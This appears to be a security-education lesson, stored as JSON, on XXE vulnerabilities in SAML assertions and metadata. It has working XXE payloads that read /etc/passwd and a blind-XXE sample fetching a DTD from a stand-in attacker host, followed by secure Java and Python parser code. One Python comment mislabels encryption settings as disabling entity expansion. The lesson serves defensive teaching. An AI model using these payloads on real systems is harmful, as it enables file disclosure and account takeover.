@@ -1,0 +1,97 @@
+{
+  "id": "saml-authentication",
+  "category": "contexts",
+  "title": "XXE in SAML Authentication",
+  "description": "XXE vulnerabilities in SAML (Security Assertion Markup Language) implementations, including authentication bypass and sensitive data disclosure risks.",
+  "severity": "critical",
+  "cvssScore": 9.1,
+  "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+  "cwe": "CWE-611: Improper Restriction of XML External Entity Reference",
+  "owasp": "OWASP Top 10:2021 - A05: Security Misconfiguration",
+  "sections": [
+    {
+      "id": "overview",
+      "title": "Overview",
+      "type": "text",
+      "content": "SAML (Security Assertion Markup Language) is an XML-based standard for exchanging authentication and authorization data. XXE vulnerabilities in SAML implementations can lead to authentication bypass, sensitive data disclosure, and complete account takeover.\n\n**Why SAML is High-Risk for XXE:**\n• All SAML assertions are XML\n• Often trusted without validation\n• Used for authentication (high-value target)\n• Complex XML signatures and encryption\n• Multiple parsing points (assertion, metadata)\n\n**Common Attack Scenarios:**\n• Service Provider (SP) parses SAML assertion from IdP\n• SP parses IdP metadata during setup\n• IdP parses authentication requests from SP\n• Metadata exchange between SP and IdP\n\n**Potential Impact:**\n• Authentication bypass (login as any user)\n• Account takeover\n• Privilege escalation\n• Internal file disclosure\n• SSRF to internal systems\n• Session hijacking"
+    },
+    {
+      "id": "saml-structure",
+      "title": "SAML Assertion Structure",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Standard SAML 2.0 Assertion -->\n<?xml version=\"1.0\"?>\n<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\"\n                 ID=\"_abc123\"\n                 Version=\"2.0\"\n                 IssueInstant=\"2024-01-15T10:00:00Z\">\n  <saml:Issuer>https://idp.example.com</saml:Issuer>\n  \n  <saml:Subject>\n    <saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\">\n      user@example.com\n    </saml:NameID>\n    <saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\">\n      <saml:SubjectConfirmationData\n          NotOnOrAfter=\"2024-01-15T10:05:00Z\"\n          Recipient=\"https://sp.example.com/saml/acs\"/>\n    </saml:SubjectConfirmation>\n  </saml:Subject>\n  \n  <saml:Conditions\n      NotBefore=\"2024-01-15T09:59:00Z\"\n      NotOnOrAfter=\"2024-01-15T10:05:00Z\">\n    <saml:AudienceRestriction>\n      <saml:Audience>https://sp.example.com</saml:Audience>\n    </saml:AudienceRestriction>\n  </saml:Conditions>\n  \n  <saml:AttributeStatement>\n    <saml:Attribute Name=\"email\">\n      <saml:AttributeValue>user@example.com</saml:AttributeValue>\n    </saml:Attribute>\n    <saml:Attribute Name=\"role\">\n      <saml:AttributeValue>user</saml:AttributeValue>\n    </saml:Attribute>\n  </saml:AttributeStatement>\n  \n  <saml:AuthnStatement AuthnInstant=\"2024-01-15T10:00:00Z\">\n    <saml:AuthnContext>\n      <saml:AuthnContextClassRef>\n        urn:oasis:names:tc:SAML:2.0:ac:classes:Password\n      </saml:AuthnContextClassRef>\n    </saml:AuthnContext>\n  </saml:AuthnStatement>\n</saml:Assertion>",
+        "isVulnerable": false,
+        "filename": "saml-assertion.xml"
+      }
+    },
+    {
+      "id": "xxe-in-assertion",
+      "title": "XXE Attack in SAML Assertion",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- XXE payload in SAML assertion -->\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\"\n                 ID=\"_abc123\"\n                 Version=\"2.0\"\n                 IssueInstant=\"2024-01-15T10:00:00Z\">\n  <saml:Issuer>https://idp.example.com</saml:Issuer>\n  \n  <saml:Subject>\n    <saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\">\n      admin@example.com&xxe;\n    </saml:NameID>\n  </saml:Subject>\n  \n  <saml:AttributeStatement>\n    <saml:Attribute Name=\"role\">\n      <!-- Injecting entity reference -->\n      <saml:AttributeValue>&xxe;</saml:AttributeValue>\n    </saml:Attribute>\n  </saml:AttributeStatement>\n</saml:Assertion>\n\n<!-- Blind XXE with parameter entity -->\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">\n  %xxe;\n]>\n<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\"\n                 ID=\"_xyz789\"\n                 Version=\"2.0\"\n                 IssueInstant=\"2024-01-15T10:00:00Z\">\n  <saml:Issuer>https://idp.example.com</saml:Issuer>\n  <saml:Subject>\n    <saml:NameID>user@example.com</saml:NameID>\n  </saml:Subject>\n</saml:Assertion>",
+        "isVulnerable": true,
+        "filename": "saml-xxe-attack.xml"
+      }
+    },
+    {
+      "id": "authentication-bypass",
+      "title": "Authentication Bypass via XXE",
+      "type": "text",
+      "content": "**Critical Attack: SAML Authentication Bypass**\n\nIf a Service Provider (SP) is vulnerable to XXE when parsing SAML assertions, attackers can potentially bypass authentication entirely.\n\n**Attack Scenario:**\n1. Attacker crafts malicious SAML assertion\n2. Assertion contains XXE payload\n3. SP parses assertion with vulnerable XML parser\n4. Attacker exploits XXE to:\n   - Read files on SP server\n   - Perform SSRF to internal services\n   - Potentially manipulate assertion validation\n\n**Why It's Critical:**\n• SAML is the authentication mechanism\n• Successful attack = complete authentication bypass\n• Can impersonate any user (including admins)\n• Often affects enterprise SSO systems\n• May grant access to multiple applications\n\n**Real-World Impact:**\n• 2015: OneLogin SAML toolkit vulnerable\n• 2018: python-saml library vulnerable\n• Multiple commercial SAML implementations affected\n• Often used in enterprise environments"
+    },
+    {
+      "id": "metadata-xxe",
+      "title": "XXE in SAML Metadata",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Malicious SAML Metadata with XXE -->\n<?xml version=\"1.0\"?>\n<!DOCTYPE EntityDescriptor [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<EntityDescriptor xmlns=\"urn:oasis:names:tc:SAML:2.0:metadata\"\n                   entityID=\"https://attacker-idp.com\">\n  \n  <IDPSSODescriptor\n      protocolSupportEnumeration=\"urn:oasis:names:tc:SAML:2.0:protocol\">\n    \n    <!-- XXE in various fields -->\n    <OrganizationName>&xxe;</OrganizationName>\n    \n    <SingleSignOnService\n        Binding=\"urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect\"\n        Location=\"https://attacker-idp.com/sso\"/>\n    \n    <KeyDescriptor use=\"signing\">\n      <ds:KeyInfo xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n        <ds:X509Data>\n          <ds:X509Certificate>&xxe;</ds:X509Certificate>\n        </ds:X509Data>\n      </ds:KeyInfo>\n    </KeyDescriptor>\n  </IDPSSODescriptor>\n  \n  <Organization>\n    <OrganizationName xml:lang=\"en\">&xxe;</OrganizationName>\n  </Organization>\n</EntityDescriptor>\n\n<!-- Attack scenario:\n1. Admin imports this metadata into SP\n2. SP parser expands entities during metadata import\n3. Attacker gains file disclosure on SP server\n4. May extract secrets, keys, or configuration\n-->",
+        "isVulnerable": true,
+        "filename": "malicious-metadata.xml"
+      }
+    },
+    {
+      "id": "java-saml-prevention",
+      "title": "Java SAML Library Secure Configuration",
+      "type": "code",
+      "code": {
+        "language": "java",
+        "code": "import org.opensaml.core.config.InitializationService;\nimport org.opensaml.core.xml.config.XMLObjectProviderRegistrySupport;\nimport org.opensaml.core.xml.io.Unmarshaller;\nimport org.opensaml.core.xml.io.UnmarshallerFactory;\nimport org.opensaml.saml.saml2.core.Assertion;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Element;\n\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport java.io.ByteArrayInputStream;\n\n// SECURE: OpenSAML configuration with XXE prevention\npublic class SecureSAMLParser {\n    \n    static {\n        try {\n            InitializationService.initialize();\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to initialize OpenSAML\", e);\n        }\n    }\n    \n    // SECURE: Create DocumentBuilderFactory with XXE protections\n    private static DocumentBuilderFactory createSecureFactory() \n            throws Exception {\n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        factory.setNamespaceAware(true);\n        \n        // Disable external entities and DTDs\n        factory.setFeature(\n            \"http://apache.org/xml/features/disallow-doctype-decl\",\n            true\n        );\n        factory.setFeature(\n            \"http://xml.org/sax/features/external-general-entities\",\n            false\n        );\n        factory.setFeature(\n            \"http://xml.org/sax/features/external-parameter-entities\",\n            false\n        );\n        factory.setFeature(\n            \"http://apache.org/xml/features/nonvalidating/load-external-dtd\",\n            false\n        );\n        factory.setXIncludeAware(false);\n        factory.setExpandEntityReferences(false);\n        \n        return factory;\n    }\n    \n    // SECURE: Parse SAML assertion safely\n    public static Assertion parseAssertion(String assertionXml) \n            throws Exception {\n        // Create secure document builder\n        DocumentBuilderFactory factory = createSecureFactory();\n        DocumentBuilder builder = factory.newDocumentBuilder();\n        \n        // Parse XML safely\n        ByteArrayInputStream inputStream = \n            new ByteArrayInputStream(assertionXml.getBytes());\n        Document document = builder.parse(inputStream);\n        Element element = document.getDocumentElement();\n        \n        // Unmarshal to SAML assertion object\n        UnmarshallerFactory unmarshallerFactory = \n            XMLObjectProviderRegistrySupport.getUnmarshallerFactory();\n        Unmarshaller unmarshaller = \n            unmarshallerFactory.getUnmarshaller(element);\n        \n        Assertion assertion = (Assertion) unmarshaller.unmarshall(element);\n        \n        // Validate assertion\n        validateAssertion(assertion);\n        \n        return assertion;\n    }\n    \n    private static void validateAssertion(Assertion assertion) {\n        // Validate issuer\n        if (assertion.getIssuer() == null) {\n            throw new SecurityException(\"Assertion must have issuer\");\n        }\n        \n        // Validate subject\n        if (assertion.getSubject() == null) {\n            throw new SecurityException(\"Assertion must have subject\");\n        }\n        \n        // Validate conditions (time bounds, audience)\n        if (assertion.getConditions() != null) {\n            // Check NotBefore and NotOnOrAfter\n            // Check audience restrictions\n        }\n        \n        // Verify signature (if present)\n        // Additional validation...\n    }\n}",
+        "isVulnerable": false,
+        "filename": "SecureSAMLParser.java"
+      }
+    },
+    {
+      "id": "python-saml-prevention",
+      "title": "Python SAML Library Secure Configuration",
+      "type": "code",
+      "code": {
+        "language": "python",
+        "code": "from onelogin.saml2.auth import OneLogin_Saml2_Auth\nfrom onelogin.saml2.utils import OneLogin_Saml2_Utils\nfrom onelogin.saml2.settings import OneLogin_Saml2_Settings\nfrom defusedxml.ElementTree import fromstring\nimport defusedxml.ElementTree as ET\n\n# SECURE: Use defusedxml for all XML parsing\ndef parse_saml_assertion_secure(assertion_xml):\n    \"\"\"\n    Securely parse SAML assertion using defusedxml\n    \n    Args:\n        assertion_xml: SAML assertion as string\n    \n    Returns:\n        Parsed ElementTree object\n    \"\"\"\n    try:\n        # Use defusedxml instead of standard xml.etree\n        # defusedxml prevents XXE by default\n        tree = fromstring(assertion_xml)\n        return tree\n    except ET.ParseError as e:\n        raise ValueError(f\"Invalid SAML XML: {e}\")\n\n# SECURE: OneLogin python-saml configuration\nclass SecureSAMLAuth:\n    \n    def __init__(self, request_data, saml_settings):\n        \"\"\"\n        Initialize SAML auth with secure configuration\n        \n        Args:\n            request_data: Flask/Django request data\n            saml_settings: SAML settings dictionary\n        \"\"\"\n        # Ensure security settings are enforced\n        if 'security' not in saml_settings:\n            saml_settings['security'] = {}\n        \n        # Critical: Disable XML entity expansion\n        saml_settings['security']['wantAssertionsEncrypted'] = True\n        saml_settings['security']['wantNameIdEncrypted'] = True\n        \n        # Initialize OneLogin SAML auth\n        self.auth = OneLogin_Saml2_Auth(request_data, saml_settings)\n    \n    def process_response(self):\n        \"\"\"\n        Process SAML response securely\n        \"\"\"\n        # Process the SAML response\n        self.auth.process_response()\n        \n        # Check for errors\n        errors = self.auth.get_errors()\n        if errors:\n            raise ValueError(f\"SAML errors: {errors}\")\n        \n        # Verify authentication\n        if not self.auth.is_authenticated():\n            raise ValueError(\"SAML authentication failed\")\n        \n        # Get user attributes\n        attributes = self.auth.get_attributes()\n        nameid = self.auth.get_nameid()\n        \n        return {\n            'nameid': nameid,\n            'attributes': attributes\n        }\n\n# SECURE: Flask example\nfrom flask import Flask, request, redirect, session\n\napp = Flask(__name__)\n\n@app.route('/saml/acs', methods=['POST'])\ndef saml_acs():\n    \"\"\"SAML Assertion Consumer Service\"\"\"\n    \n    # Prepare request data for OneLogin\n    req = {\n        'http_host': request.host,\n        'script_name': request.path,\n        'get_data': request.args.copy(),\n        'post_data': request.form.copy()\n    }\n    \n    # Load SAML settings (from config file)\n    saml_settings = load_saml_settings()\n    \n    # Process SAML response securely\n    try:\n        auth = SecureSAMLAuth(req, saml_settings)\n        user_data = auth.process_response()\n        \n        # Create user session\n        session['saml_nameid'] = user_data['nameid']\n        session['saml_attributes'] = user_data['attributes']\n        \n        return redirect('/dashboard')\n        \n    except Exception as e:\n        # Log error (don't expose to user)\n        app.logger.error(f\"SAML processing error: {e}\")\n        return \"Authentication failed\", 403\n\ndef load_saml_settings():\n    \"\"\"Load SAML settings from config\"\"\"\n    return {\n        'sp': {\n            'entityId': 'https://sp.example.com',\n            'assertionConsumerService': {\n                'url': 'https://sp.example.com/saml/acs',\n                'binding': 'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST'\n            }\n        },\n        'idp': {\n            'entityId': 'https://idp.example.com',\n            'singleSignOnService': {\n                'url': 'https://idp.example.com/sso',\n                'binding': 'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect'\n            }\n        },\n        'security': {\n            'wantAssertionsEncrypted': True,\n            'wantNameIdEncrypted': True,\n            'wantAssertionsSigned': True,\n            'signatureAlgorithm': 'http://www.w3.org/2001/04/xmldsig-more#rsa-sha256'\n        }\n    }",
+        "isVulnerable": false,
+        "filename": "secure_saml_auth.py"
+      }
+    },
+    {
+      "id": "prevention-checklist",
+      "title": "SAML XXE Prevention Checklist",
+      "type": "text",
+      "content": "☐ **Service Provider (SP) Protection**\n   • Disable external entity resolution in XML parser\n   • Disable DTD processing entirely\n   • Validate SAML assertions before parsing\n   • Verify assertion signatures\n   • Implement assertion replay protection\n\n☐ **Identity Provider (IdP) Protection**\n   • Secure parsing of authentication requests\n   • Validate metadata before importing\n   • Disable entity expansion in XML parser\n\n☐ **Library-Specific Configuration**\n   • **Java (OpenSAML):** Configure secure DocumentBuilderFactory\n   • **Python (python-saml):** Use defusedxml for parsing\n   • **.NET:** Set DtdProcessing.Prohibit\n   • **PHP:** Use libxml_disable_entity_loader(true)\n\n☐ **Metadata Handling**\n   • Validate metadata XML before importing\n   • Use HTTPS for metadata exchange\n   • Manually verify metadata sources\n   • Don't auto-import untrusted metadata\n\n☐ **Additional Security**\n   • Require signed assertions\n   • Encrypt sensitive attributes\n   • Implement time-based assertion validation\n   • Use HTTPS for all SAML exchanges\n   • Monitor for suspicious assertions\n\n☐ **Testing**\n   • Test with XXE payloads in assertions\n   • Test metadata import with malicious XML\n   • Verify entities not expanded\n   • Test authentication bypass scenarios\n   • Use automated security scanners"
+    }
+  ],
+  "relatedTopics": ["xml-basics", "java-prevention", "python-prevention", "authentication-bypass"],
+  "references": [
+    {
+      "title": "OWASP SAML Security Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html"
+    },
+    {
+      "title": "SAML 2.0 Specification",
+      "url": "http://docs.oasis-open.org/security/saml/Post2.0/sstc-saml-tech-overview-2.0.html"
+    }
+  ]
+}
